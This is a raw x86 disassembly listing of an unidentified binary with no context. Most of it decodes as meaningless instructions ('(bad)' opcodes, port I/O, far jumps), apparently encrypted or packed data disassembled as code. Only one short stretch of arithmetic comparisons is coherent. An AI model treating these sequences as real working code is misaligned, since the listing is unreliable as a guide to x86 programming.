  403ad7:	mov    edi,0x44fc0b70
  403adc:	sub    bl,BYTE PTR [eax+0x8]
  403adf:	adc    eax,0x9a2f2d08
  403ae4:	(bad)  
  403ae5:	fstp   QWORD PTR [esi+0x91210da]
  403aeb:	cdq    
  403aec:	sub    BYTE PTR [esi],bh
  403aee:	mov    eax,ds:0xa76ff8f5
  403af3:	xlat   BYTE PTR ds:[ebx]
  403af4:	out    dx,al
  403af5:	jp     0x403a8d
  403af7:	push   eax
  403af8:	add    ah,BYTE PTR [ebx+0x7a18de25]
  403afe:	cmc    
  403aff:	jge    0x403b52
  403b01:	cmp    eax,0x30bd6352
  403b06:	sub    DWORD PTR [ecx],ebp
  403b08:	xchg   esi,eax
  403b09:	push   DWORD PTR ds:0x3f883782
  403b0f:	xchg   ch,dh
  403b11:	dec    ebp
  403b12:	adc    dh,bl
  403b14:	scas   eax,DWORD PTR es:[edi]
  403b15:	loope  0x403b3d
  403b17:	inc    ebp
  403b18:	scas   al,BYTE PTR es:[edi]
  403b19:	pop    ebx
  403b1a:	sub    ebp,DWORD PTR [esi+0x29461f96]
  403b20:	cmp    dl,BYTE PTR [ecx]
  403b22:	popa   
  403b23:	pop    DWORD PTR [ebx+0x51]
  403b26:	lea    esp,[edi+ecx*8]
  403b29:	push   edi
  403b2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b2b:	pop    eax
  403b2c:	aaa    
  403b2d:	je     0x403af1
  403b2f:	aad    0x93
  403b31:	inc    edi
  403b32:	ins    DWORD PTR es:[edi],dx
  403b33:	mov    edx,0x477b77fb
  403b38:	les    esp,FWORD PTR [ecx+0x5279481c]
  403b3e:	fstp   QWORD PTR [esi+0xe]
  403b41:	and    bl,BYTE PTR [edi]
  403b43:	sub    ebx,ebp
  403b45:	xchg   esi,eax
  403b46:	or     al,BYTE PTR [eax-0x57]
  403b49:	mov    edx,0x68f9ee35
  403b4e:	xchg   ebp,eax
  403b4f:	shl    DWORD PTR ds:[eax],0x24
  403b53:	ins    DWORD PTR es:[edi],dx
  403b54:	cmp    bh,0x6e
  403b57:	adc    DWORD PTR [edi+0x65577314],0x7a
  403b5e:	fsubr  QWORD PTR ds:0x7cc58c82
  403b64:	pop    ecx
  403b65:	push   esp
  403b66:	jmp    0x1b7c9178
  403b6b:	fdiv   DWORD PTR [eax-0x43f3c9c]
  403b71:	or     al,0x76
  403b73:	push   0xffffff88
  403b75:	xlat   BYTE PTR ds:[ebx]
  403b76:	sbb    esi,DWORD PTR [ebx+0x7]
  403b79:	rcr    BYTE PTR [edx-0x5f],0xf9
  403b7d:	xor    BYTE PTR [edi-0x6f],cl
  403b80:	sbb    eax,0x1e6209ce
  403b85:	aaa    
  403b86:	test   DWORD PTR [eax],esi
  403b88:	scas   al,BYTE PTR es:[edi]
  403b89:	jp     0x403bf7
  403b8b:	jae    0x403b24
  403b8d:	aaa    
  403b8e:	push   ss
  403b8f:	add    BYTE PTR [edi-0x5c947160],ah
  403b95:	scas   al,BYTE PTR es:[edi]
  403b96:	sbb    al,0x73
  403b98:	adc    BYTE PTR [ecx+0x27],dl
  403b9b:	shl    BYTE PTR [ebx-0xe],1
  403b9e:	pop    ecx
  403b9f:	pop    edx
  403ba0:	je     0x403b85
  403ba2:	fcmovnu st,st(1)
  403ba4:	xor    eax,0x6aaf612d
  403ba9:	mov    ds:0x2be03014,al
  403bae:	cmp    eax,0xa1537053
  403bb3:	les    ebx,FWORD PTR [ebp-0x1f7ea574]
  403bb9:	mov    gs,esp
  403bbb:	add    al,0x59
  403bbd:	stc    
  403bbe:	mov    ebx,0xe5da6c2d
  403bc3:	pop    ebp
  403bc4:	xchg   DWORD PTR [edx+0x7196e285],esi
  403bca:	pop    ss
  403bcb:	inc    ebx
  403bcc:	das    
  403bcd:	fdiv   st,st(0)
  403bcf:	aas    
  403bd0:	pop    edx
  403bd1:	in     al,0xd5
  403bd3:	push   esp
  403bd4:	push   edi
  403bd5:	sub    al,0x8a
  403bd7:	dec    esp
  403bd8:	cmp    ch,BYTE PTR [edx-0x12b30f33]
  403bde:	inc    eax
  403bdf:	aaa    
  403be0:	cmp    ch,cl
  403be2:	addr16 push edi
  403be4:	push   ebp
  403be5:	and    BYTE PTR [ebx],bh
  403be7:	not    DWORD PTR [esi-0x80]
  403bea:	pop    ebp
  403beb:	mov    al,0x55
  403bed:	out    dx,eax
  403bee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bef:	out    0xd3,eax
  403bf1:	xchg   ebp,eax
  403bf2:	mov    cs,WORD PTR [ecx-0x722c4a8c]
  403bf8:	xor    bl,BYTE PTR gs:[ebp-0x23]
  403bfc:	xchg   edx,eax
  403bfd:	loope  0x403b88
  403bff:	inc    esp
  403c00:	add    BYTE PTR [ebx-0x78],0x9c
  403c04:	sti    
  403c05:	or     edx,DWORD PTR [eax+0x9]
  403c08:	fsub   QWORD PTR [ebx+eiz*4-0x247b3e4c]
  403c0f:	leave  
  403c10:	inc    edi
  403c11:	dec    edi
  403c12:	pusha  
  403c13:	ret    0xc4ea
  403c16:	xor    BYTE PTR [edi+0x23],dl
  403c19:	add    eax,0x6c13b65
  403c1e:	(bad)
  403c22:	cmp    BYTE PTR [esi+0xa],ah
  403c25:	sti    
  403c26:	push   ds
  403c27:	sub    al,0xe8
  403c29:	dec    edx
  403c2a:	aam    0x1
  403c2c:	or     al,0xec
  403c2e:	inc    esi
  403c2f:	mov    ?,WORD PTR [edi+eiz*2-0x58c9239c]
  403c36:	inc    ebp
  403c37:	mov    ebp,0x789fb783
  403c3c:	add    eax,0xc4cd92d6
  403c41:	sahf   
  403c42:	iret   
  403c43:	into   
  403c44:	shr    DWORD PTR [edi+0x4e2e2e9d],0x37
  403c4b:	lahf   
  403c4c:	cmp    eax,0xd6a1b83b
  403c51:	sub    al,0x9f
  403c53:	test   al,0xe
  403c55:	jp     0x403cd4
  403c57:	sar    DWORD PTR [eax-0x64],0x8e
  403c5b:	or     bh,BYTE PTR [esp+ecx*2-0x125f321d]
  403c62:	cmp    ecx,0x20109e51
  403c68:	ss in  al,dx
  403c6a:	push   0x4e
  403c6c:	(bad)  [esi]
  403c6e:	xor    al,0x8d
  403c70:	inc    edi
  403c71:	xchg   ebx,eax
  403c72:	aaa    
  403c73:	xlat   BYTE PTR ds:[ebx]
  403c74:	pusha  
  403c75:	ret    0x977c
  403c78:	sub    eax,0x89124388
  403c7d:	leave  
  403c7e:	cmp    al,0x4f
  403c80:	pop    edi
  403c81:	ins    BYTE PTR es:[edi],dx
  403c82:	ja     0x403c05
  403c84:	jg     0x403c2f
  403c86:	jne    0x403c1e
  403c88:	cmp    DWORD PTR [ebp+0x4834b39d],edx
  403c8e:	mov    esp,0x77863241
  403c93:	mov    bh,0x47
  403c95:	outs   dx,BYTE PTR ds:[esi]
  403c96:	and    DWORD PTR [esp+ebp*1-0x73eab72e],ebp
  403c9d:	(bad)  
  403c9e:	ja     0x403cee
  403ca0:	xchg   DWORD PTR [ebx+0x70],esi
  403ca3:	cmp    bh,BYTE PTR [eax+0x75f1b69d]
  403ca9:	out    dx,eax
  403caa:	out    0xcd,eax
  403cac:	mov    ?,WORD PTR [esi]
  403cae:	adc    cl,0x78
  403cb1:	pushf  
  403cb2:	dec    eax
  403cb3:	inc    edx
  403cb4:	sub    al,BYTE PTR [ebx+0x7c6c4faf]
  403cba:	add    eax,0x33ed731b
  403cbf:	mov    DWORD PTR [edx-0x22],ebx
  403cc2:	mov    bl,0x79
  403cc4:	stos   BYTE PTR es:[edi],al
  403cc5:	iret   
  403cc6:	jecxz  0x403c71
  403cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc9:	lock dec eax
  403ccb:	aad    0x7
  403ccd:	sub    edx,DWORD PTR [ebp-0x6]
  403cd0:	fld    QWORD PTR [ebp+0x20142568]
  403cd6:	daa    
  403cd7:	push   cs
  403cd8:	leave  
  403cd9:	adc    ah,ah
  403cdb:	inc    ebx
  403cdc:	stos   DWORD PTR es:[edi],eax
  403cdd:	ror    ebx,1
  403cdf:	add    ebx,DWORD PTR [ebx+0x3502c502]
  403ce5:	pop    ebx
  403ce6:	mov    ds:0x6b626935,eax
  403ceb:	in     eax,dx
  403cec:	ficomp WORD PTR [esi-0x1a]
  403cef:	shr    bl,0xdb
  403cf2:	sub    esp,DWORD PTR [esi+0x3a9799e8]
  403cf8:	in     al,0x34
  403cfa:	mov    DWORD PTR [ebx+0x56b44aa1],ebx
  403d00:	femms  
  403d02:	inc    edi
  403d03:	mov    WORD PTR [esi],?
  403d05:	in     al,0x85
  403d07:	xor    eax,0x63ad456a
  403d0c:	pusha  
  403d0d:	xor    al,0x96
  403d0f:	sub    ebp,DWORD PTR [edi]
  403d11:	scas   eax,DWORD PTR es:[edi]
  403d12:	dec    edx
  403d13:	adc    ebx,DWORD PTR [esi-0x54631c59]
  403d19:	loop   0x403d39
  403d1b:	lahf   
  403d1c:	aas    
  403d1d:	cmp    bl,BYTE PTR [edx+0x38146338]
  403d23:	ss inc ecx
  403d25:	int    0x6b
  403d27:	fbld   TBYTE PTR [esi-0x3c]
  403d2a:	mov    ebp,0x9f436af5
  403d2f:	inc    esi
  403d30:	shl    edi,cl
  403d32:	js     0x403d86
  403d34:	rol    bl,0x34
  403d37:	mov    ch,0xcf
  403d39:	imul   edi,DWORD PTR [ecx-0x188b0d21],0xffffffbb
  403d40:	(bad)  
  403d41:	mov    esp,0x9d35642f
  403d46:	push   ds
  403d47:	fnstsw WORD PTR [ebp-0xb]
  403d4a:	(bad)  
  403d4b:	sbb    DWORD PTR [esi],eax
  403d4d:	hlt    
  403d4e:	xchg   edi,eax
  403d4f:	pop    ebx
  403d50:	jmp    DWORD PTR [esp+ebx*2+0x175ce85e]
  403d57:	out    dx,eax
  403d58:	retf   0xacbc
  403d5b:	(bad)  
  403d5d:	rcl    BYTE PTR [eax+eax*8+0x4114caa6],1
  403d64:	xlat   BYTE PTR ds:[ebx]
  403d65:	push   ss
  403d66:	aas    
  403d67:	div    DWORD PTR [eax+0x3a]
  403d6a:	add    ebx,DWORD PTR [ecx]
  403d6c:	fild   QWORD PTR [edx-0x77]
  403d6f:	pop    ebx
  403d70:	cdq    
  403d71:	sbb    ch,BYTE PTR [esi]
  403d73:	sbb    BYTE PTR [esi+0x33c19d9a],0x82
  403d7a:	or     al,0x6b
  403d7c:	bound  edi,QWORD PTR [edi+0x262131b2]
  403d82:	and    dl,BYTE PTR [eax]
  403d84:	xchg   BYTE PTR [esi+0xc],dh
  403d87:	adc    al,0x25
  403d89:	aad    0x11
  403d8b:	fld    DWORD PTR [edx-0x420276ff]
  403d91:	push   ss
  403d92:	repnz clc 
  403d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d95:	repz inc esi
  403d97:	inc    edx
  403d98:	lds    eax,FWORD PTR [ebx+0x55bf0a0]
  403d9e:	jmp    0x403d69
  403da0:	adc    esp,DWORD PTR [esi]
  403da2:	and    eax,0x795e3eb1
  403da7:	or     ecx,DWORD PTR [ecx+0x1a]
  403daa:	cmp    ecx,esp
  403dac:	daa    
  403dad:	add    al,0xd0
  403daf:	push   edx
  403db0:	mov    ah,0x79
  403db2:	jbe    0x403dbf
  403db4:	xchg   ecx,eax
  403db5:	fmul   DWORD PTR [esi+edx*1-0x31b9cd64]
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x7d
  403e75:	pop    eax
  403e76:	lahf   
  403e77:	dec    DWORD PTR [edx]
  403e79:	pop    ds
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403eb7
  403e81:	dec    esi
  403e82:	sub    DWORD PTR [esi+esi*8],esi
  403e85:	cld    
  403e86:	sub    BYTE PTR [eax],al
  403e88:	dec    edi
  403e89:	mov    eax,0x42ff7c94
  403e8e:	inc    ebx
  403e8f:	ret    
  403e90:	add    eax,0x36734370
  403e95:	mov    ebp,0x22aac53b
  403e9a:	adc    DWORD PTR [esi+eiz*2],0xccedaac0
  403ea1:	pusha  
  403ea2:	xchg   ebx,eax
  403ea3:	lahf   
  403ea4:	or     DWORD PTR [ecx+edx*8],ebx
  403ea7:	clc    
  403ea8:	add    BYTE PTR [edx+0xa],ah
  403eab:	push   edx
  403eac:	dec    edi
  403ead:	test   BYTE PTR [edx+0x4e],dh
  403eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eb1:	cmp    ecx,DWORD PTR [ebx-0x8]
  403eb4:	ss retf 
  403eb6:	es jno 0x403e59
  403eb9:	add    ah,BYTE PTR [ebp+0x10045347]
  403ebf:	inc    edx
  403ec0:	mov    edi,0x4536f386
  403ec5:	out    0x87,al
  403ec7:	rol    BYTE PTR [edi+0x44],1
  403eca:	or     al,0xfe
  403ecc:	lahf   
  403ecd:	mov    dh,0xde
  403ecf:	jb     0x403f17
  403ed1:	jnp    0x9352f52f
  403ed7:	and    DWORD PTR [esi+0x3379bdc0],edx
  403edd:	imul   esp,DWORD PTR [esi-0x40],0x50
  403ee1:	jmp    0x874e:0x678e47c7
  403ee8:	xchg   DWORD PTR [ebp-0x63],edi
  403eeb:	cmp    dl,BYTE PTR [ebx-0x7a013ec2]
  403ef1:	mov    ebp,0x520164e5
  403ef6:	jne    0x403ee2
  403ef8:	mov    ds:0x6dd6b1eb,eax
  403efd:	pop    ds
  403efe:	push   edi
  403eff:	push   eax
  403f00:	push   ecx
  403f01:	or     ch,dl
  403f03:	mov    ebp,0xbbf7e1e0
  403f08:	xor    DWORD PTR [ebx],ebx
  403f0a:	cmp    ah,dh
  403f0c:	mov    ebx,0xe5c6b0b3
  403f11:	imul   ebx,eax,0xffffff89
  403f14:	enter  0x33e6,0x75
  403f18:	scas   eax,DWORD PTR es:[edi]
  403f19:	mov    ah,0xc0
  403f1b:	mov    bl,0x75
  403f1d:	and    BYTE PTR [esp+eiz*2],0x41
  403f21:	aaa    
  403f22:	sbb    DWORD PTR cs:[eax],0x7b
  403f26:	xchg   ebp,eax
  403f27:	sub    BYTE PTR [ebx-0x2f9e33be],dl
  403f2d:	sbb    al,0xec
  403f30:	sub    edx,DWORD PTR [ecx-0x2b]
  403f33:	jp     0x403f60
  403f35:	cmp    al,0x78
  403f37:	pop    ebp
  403f38:	jl     0x403ef9
  403f3a:	xor    DWORD PTR [edi-0x2a316bba],edi
  403f40:	jne    0x403ee5
  403f42:	mov    esp,0x9556855d
  403f47:	mov    ds:0xda507436,eax
  403f4c:	and    DWORD PTR [ecx-0x22bbec2a],ebp
  403f52:	jo     0x403f02
  403f54:	jle    0x403faa
  403f56:	add    ebx,esi
  403f58:	ins    BYTE PTR es:[edi],dx
  403f59:	push   ebx
  403f5a:	mov    esi,0x300c645c
  403f5f:	mov    ecx,0xe8000e27
  403f64:	or     DWORD PTR [edx-0x20b76a4e],ebx
  403f6a:	stos   BYTE PTR es:[edi],al
  403f6b:	sar    esi,cl
  403f6d:	add    al,0x4b
  403f6f:	jno    0x403f00
  403f71:	repz lea ecx,[edi+0x8]
  403f75:	mov    esi,?
  403f77:	add    al,0x42
  403f79:	push   edi
  403f7a:	ins    DWORD PTR es:[edi],dx
  403f7b:	cmc    
  403f7c:	mov    edx,0x72d3ac5a
  403f81:	xchg   esi,eax
  403f82:	fild   QWORD PTR [ebx+0x54]
  403f85:	push   ecx
  403f86:	mov    cl,0xe0
  403f88:	pop    ebp
  403f89:	inc    eax
  403f8a:	das    
  403f8b:	gs jmp 0x9397577d
  403f91:	push   ebx
  403f92:	dec    esp
  403f93:	fsubr  QWORD PTR [edi]
  403f95:	outs   dx,DWORD PTR ds:[esi]
  403f96:	aad    0xeb
  403f98:	mov    esp,0x712b3915
  403f9d:	mov    edx,0xd993713e
  403fa2:	leave  
  403fa3:	aad    0xda
  403fa5:	std    
  403fa6:	iret   
  403fa7:	sbb    al,0x5c
  403fa9:	dec    edi
  403faa:	adc    ah,ch
  403fac:	repnz mov ebx,0xcc4c830f
  403fb2:	and    eax,0x7044e9e4
  403fb7:	retf   0xc0f9
  403fba:	mov    cl,0xd5
  403fbc:	aas    
  403fbd:	push   ss
  403fbe:	push   edi
  403fc0:	jo     0x40400d
  403fc2:	pop    ebx
  403fc3:	jno    0x403f4f
  403fc5:	or     al,0x7
  403fc7:	sbb    eax,DWORD PTR [edx-0x45]
  403fca:	or     ah,dh
  403fcc:	pop    ds
  403fcd:	sbb    edx,ebx
  403fcf:	int    0xd1
  403fd1:	and    al,BYTE PTR [edx+eiz*8-0x5eb8dbb5]
  403fd8:	in     al,0xda
  403fda:	add    eax,0x1c22d2aa
  403fdf:	xlat   BYTE PTR ds:[ebx]
  403fe0:	xchg   esi,eax
  403fe1:	bound  esp,QWORD PTR [edx+edi*4]
  403fe4:	stos   BYTE PTR es:[edi],al
  403fe5:	scas   al,BYTE PTR es:[edi]
  403fe6:	imul   ebp,DWORD PTR [eax],0xfe77ff32
  403fec:	jge    0x403faa
  403fee:	adc    dl,BYTE PTR [ebp+edi*8-0x27]
  403ff2:	lea    esi,[edi]
  403ff4:	inc    ecx
  403ff5:	mov    edx,0x4dd8c178
  403ffa:	push   ecx
  403ffb:	cmp    cl,BYTE PTR [ebx-0x7f]
  403ffe:	xchg   ecx,eax
  403fff:	arpl   WORD PTR [edi],bx
  404001:	push   0x15617620
  404006:	lods   al,BYTE PTR ds:[esi]
  404007:	dec    edx
  404008:	xor    eax,0x2575c80
  40400d:	add    BYTE PTR [ebp+0x6a],ah
  404010:	repnz scas eax,DWORD PTR es:[edi]
  404012:	bound  ecx,QWORD PTR [ebp-0x4a7e443c]
  404018:	sub    BYTE PTR ds:0x3dd060eb,ah
  40401e:	mov    ebx,0x43dc8d3b
  404023:	pop    eax
  404024:	les    ebp,FWORD PTR [ebx]
  404026:	and    bl,BYTE PTR [edx-0xe]
  404029:	repnz mov ebp,0xaae36db5
  40402f:	test   al,0x80
  404031:	ins    BYTE PTR es:[edi],dx
  404032:	lds    ecx,FWORD PTR [edi]
  404034:	mov    al,0xbe
  404036:	adc    eax,0x6865ecdf
  40403b:	mov    bl,0xb3
  40403d:	pop    ds
  40403e:	jmp    0x3d3e:0x2274beaf
  404045:	mov    dl,0x3c
  404047:	inc    ecx
  404048:	test   al,0xcf
  40404a:	jbe    0x404083
  40404c:	rcr    BYTE PTR [eax-0x35f0c797],1
  404052:	xchg   esp,eax
  404053:	or     eax,0x2e54489b
  404058:	dec    esp
  404059:	ror    DWORD PTR [ecx],cl
  40405b:	sub    edi,DWORD PTR [eax]
  40405d:	xor    DWORD PTR [esi],esp
  40405f:	arpl   WORD PTR [eax+0x649774b4],bx
  404065:	(bad)  [esi]
  404067:	mov    ecx,0x65293347
  40406c:	ss test al,0x7
  40406f:	pop    ds
  404070:	pop    edi
  404071:	retf   0xbbe3
  404074:	push   ss
  404075:	xor    al,0x1c
  404077:	js     0x40401b
  404079:	adc    cl,BYTE PTR ss:[eax-0x7973ab6]
  404080:	pushf  
  404081:	mov    ebp,0x8487666a
  404086:	pusha  
  404087:	neg    BYTE PTR [esi+0x5a]
  40408a:	scas   eax,DWORD PTR es:[edi]
  40408b:	(bad)  
  40408c:	cmp    DWORD PTR [ebx],edi
  40408e:	pop    ds
  40408f:	clc    
  404090:	aad    0x89
  404092:	push   cs
  404093:	pop    edi
  404094:	lods   al,BYTE PTR ds:[esi]
  404095:	add    DWORD PTR ds:0x67a55ad0,edi
  40409b:	adc    eax,0xac83e53
  4040a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040a1:	add    BYTE PTR ds:0x21d9ae32,ah
  4040a7:	pop    ds
  4040a8:	lds    esp,FWORD PTR [edi+edx*4+0x38b8dfc5]
  4040af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040b0:	mov    eax,ds:0x243fc688
  4040b5:	ret    0x81b
  4040b8:	(bad)
  4040bb:	sub    al,0x94
  4040bd:	sub    al,BYTE PTR [edx+0x4072523d]
  4040c3:	pop    esp
  4040c4:	pop    ebp
  4040c5:	repnz shl BYTE PTR [eax-0x2c85990b],1
  4040cc:	mov    esi,0x62e389d2
  4040d1:	jecxz  0x404139
  4040d3:	aaa    
  4040d4:	out    0x94,al
  4040d6:	popf   
  4040d7:	cwde   
  4040d8:	lds    esi,FWORD PTR [edi+esi*4-0x45ce8477]
  4040df:	rcr    DWORD PTR [ebx-0x3a],0xf3
  4040e3:	adc    BYTE PTR [ebp+0x63fb9609],0xfb
  4040ea:	rcr    dl,cl
  4040ec:	repz mov ds:0x4c17400,al
  4040f2:	and    DWORD PTR [eax],0x4b3b2784
  4040f8:	outs   dx,BYTE PTR ds:[esi]
  4040f9:	cwde   
  4040fa:	mov    dh,0xe
  4040fc:	jmp    0xb42d:0xad0e6322
  404103:	(bad)  
  404104:	nop
  404105:	retf   0x45c4
  404108:	aad    0x47
  40410a:	out    dx,eax
  40410b:	ret    0x4237
  40410e:	test   BYTE PTR [eax],bl
  404110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404111:	sbb    BYTE PTR [ecx],dh
  404113:	repz xchg esp,eax
  404115:	ins    DWORD PTR es:[edi],dx
  404116:	mov    dh,0xbb
  404118:	inc    eax
  404119:	ficom  DWORD PTR [esi+0xc]
  40411c:	cmp    al,0x8
  40411e:	gs ins BYTE PTR es:[edi],dx
  404120:	aam    0xfe
  404122:	sahf   
  404123:	mov    ch,0x78
  404125:	stc    
  404126:	imul   BYTE PTR [ebx+0xe269a47]
  40412c:	jg     0x404187
  40412e:	neg    DWORD PTR [ebp-0x21239333]
  404134:	sbb    BYTE PTR [esi],dh
  404136:	sbb    BYTE PTR fs:[ecx+0x5025fdc6],dl
  40413d:	mov    bh,0xd2
  40413f:	xchg   ah,ah
  404141:	sub    eax,DWORD PTR [edi]
  404143:	mov    DWORD PTR es:[ebp+0x32],ebp
  404147:	and    al,0xd2
  404149:	mov    dl,0xbe
  40414b:	(bad)  
  40414d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40414e:	mov    al,0x6f
  404150:	mov    ?,WORD PTR [esi-0x31675a92]
  404156:	(bad)  
  404158:	sbb    BYTE PTR [ecx-0x8fe8fd0],ah
  40415e:	jmp    WORD PTR [edi-0x75]
  404162:	nop
  404163:	mov    BYTE PTR [edi],dh
  404165:	shr    BYTE PTR [ebx],0xdf
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [edi],bh
  40418b:	shl    BYTE PTR [ecx+0x7e1d740f],0x7e
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x40418b
  404197:	cmp    BYTE PTR [ebx+0x5ef1bbae],0xce
  40419e:	pop    edi
  40419f:	jmp    0x1c3dea04
  4041a4:	loopne 0x404157
  4041a6:	mov    cl,0x81
  4041a8:	pop    ecx
  4041a9:	jae    0x4041b1
  4041ab:	imul   DWORD PTR [edx+0x50]
  4041ae:	xchg   ecx,eax
  4041af:	jecxz  0x404184
  4041b1:	dec    esp
  4041b2:	loop   0x404204
  4041b4:	inc    ebx
  4041b5:	sub    BYTE PTR [edx-0x45],dl
  4041b8:	mov    esi,0xe236bdc4
  4041bd:	iret   
  4041be:	adc    cl,BYTE PTR ds:0x5374d2b7
  4041c4:	pushf  
  4041c5:	dec    ebx
  4041c6:	dec    edi
  4041c7:	clc    
  4041c8:	(bad)  
  4041c9:	jnp    0x404177
  4041cb:	mov    dl,0xf1
  4041cd:	dec    esp
  4041ce:	pop    eax
  4041cf:	mov    DWORD PTR [edx-0x71],edi
  4041d2:	jl     0x404218
  4041d4:	loope  0x40420c
  4041d6:	add    eax,0x7335d3d5
  4041db:	cmp    esp,DWORD PTR [ecx]
  4041dd:	jne    0x4041f8
  4041df:	scas   al,BYTE PTR es:[edi]
  4041e0:	int3   
  4041e1:	pop    ebx
  4041e2:	sub    esi,ecx
  4041e4:	mov    dh,0x84
  4041e6:	nop
  4041e7:	or     BYTE PTR [eax-0x7b],ah
  4041ea:	add    eax,eax
  4041ec:	mov    edx,0x6e541ff2
  4041f1:	and    bl,ah
  4041f3:	jmp    0x9cb99441
  4041f8:	adc    al,0x12
  4041fa:	dec    ecx
  4041fb:	cmp    eax,0xcef9b1ab
  404200:	lods   eax,DWORD PTR ds:[esi]
  404201:	aaa    
  404202:	mov    edx,0x8810914c
  404207:	out    0x5,eax
  404209:	shl    BYTE PTR [esi],0xe6
  40420c:	cmp    dh,BYTE PTR [edx]
  40420e:	and    eax,DWORD PTR [edx]
  404210:	or     al,0xeb
  404212:	inc    ebp
  404213:	push   esi
  404214:	les    ebp,FWORD PTR [edx-0x584963c8]
  40421a:	cmp    ecx,DWORD PTR [ecx-0x5e]
  40421d:	add    al,0xe2
  40421f:	cmp    al,0x43
  404221:	in     eax,0xf9
  404223:	aas    
  404224:	dec    ebp
  404225:	push   esi
  404226:	mov    esi,0xf3db6493
  40422b:	push   ebp
  40422c:	cmp    DWORD PTR [edx],0xffffff9a
  40422f:	leave  
  404230:	cmp    DWORD PTR [ebx+0x3d],eax
  404233:	(bad)  
  404234:	pop    ebp
  404235:	(bad)  
  404236:	adc    eax,0xce378585
  40423b:	out    0xdd,al
  40423d:	sub    bl,BYTE PTR [ebx]
  40423f:	fwait
  404240:	push   ebp
  404241:	pusha  
  404242:	scas   eax,DWORD PTR es:[edi]
  404243:	shl    BYTE PTR [ebx+0x62],cl
  404246:	and    bh,bh
  404248:	sti    
  404249:	mov    ch,0x77
  40424b:	xchg   ecx,eax
  40424c:	ffree  st(6)
  40424e:	xchg   BYTE PTR [eax],bl
  404250:	pop    esi
  404251:	dec    esp
  404252:	icebp  
  404253:	ret    
  404254:	and    dl,BYTE PTR ds:0xa7e21391
  40425a:	inc    ebp
  40425b:	mov    ds:0x8b38a18a,al
  404260:	sub    edi,DWORD PTR [edx-0x16d42308]
  404266:	in     al,dx
  404267:	sbb    BYTE PTR [eax],ch
  404269:	jne    0x4042c2
  40426b:	mov    edi,cs
  40426d:	nop
  40426e:	mov    ds:0x876376fb,al
  404273:	fsub   QWORD PTR [edi]
  404275:	xor    DWORD PTR [edi-0x4f5cec],ecx
  40427b:	aas    
  40427c:	or     DWORD PTR [eax+ecx*1+0x70],esp
  404280:	cmp    esp,DWORD PTR [edi+0x55]
  404283:	mov    WORD PTR ds:0xab525dff,es
  404289:	sti    
  40428a:	cmp    ebx,DWORD PTR [ebp+0x5b]
  40428d:	sbb    eax,0x1a00e77a
  404292:	imul   esi,edi,0xfffffffe
  404295:	xchg   ecx,eax
  404296:	push   ebp
  404297:	dec    esi
  404298:	and    WORD PTR [edx+0x20],si
  40429c:	pop    esp
  40429d:	jmp    0xf8bf:0xbac1620d
  4042a4:	and    ah,BYTE PTR [edi-0x49]
  4042a7:	push   edx
